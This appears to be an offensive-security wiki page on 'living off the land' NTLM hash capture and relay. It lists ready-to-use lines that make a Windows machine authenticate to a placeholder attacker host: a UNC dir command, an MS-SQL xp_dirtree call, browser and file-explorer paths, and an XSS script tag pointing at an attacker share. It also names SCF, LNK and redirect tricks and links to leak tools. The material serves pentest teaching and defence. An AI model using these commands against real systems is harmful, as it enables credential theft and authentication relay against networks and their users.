# 🛠️ Living off the land

Using tools already there, command execution, code execution, to create trafic and capture hashes or relay authentications.

An attacker able to execute code or commands on a machine can make it authenticate somewhere in many ways.

| Type | Command/code | Outgoing protocol |
| :--- | :--- | :--- |
| DOS/Powershell | `dir \\$ATTACKER_IP\unicorn` | SMB |
| from a file explorer | `\\$ATTACKER_IP\something` | SMB |
| from a browser | `http://ATTACKER_IP/` | HTTP |
| MS-SQL | `EXEC master.sys.xp_dirtree '\\$ATTACKER_IP\unicorn',1, 1` | SMB |

SCF, LNK, .URL etc.



XSS \(like `<script>language='javascript' src='\\$ATTACKER_IP\something'</script>`\)

Other attacks that allow to edit the website content and make browsers request the attacker

SMB trap etc. HTTP server sends 302 redirect to file://attacker\_ip/something

[https://intrinium.com/smb-relay-attack-tutorial/](https://intrinium.com/smb-relay-attack-tutorial/)



.XML, IncludePicture Field \(Word\), hyperlink



[https://github.com/3gstudent/Worse-PDF](https://github.com/3gstudent/Worse-PDF) [https://github.com/deepzec/Bad-Pdf](https://github.com/deepzec/Bad-Pdf)



[https://github.com/Gl3bGl4z/All\_NTLM\_leak](https://github.com/Gl3bGl4z/All_NTLM_leak)

[https://mgp25.com/research/infosec/Leaking-NTLM-hashes/](https://mgp25.com/research/infosec/Leaking-NTLM-hashes/)

[https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes\#office](https://www.securify.nl/blog/living-off-the-land-stealing-netntlm-hashes#office)

[https://logrhythm.com/blog/what-are-living-off-the-land-attacks/](https://logrhythm.com/blog/what-are-living-off-the-land-attacks/)

[https://www.ired.team/offensive-security/initial-access](https://www.ired.team/offensive-security/initial-access)

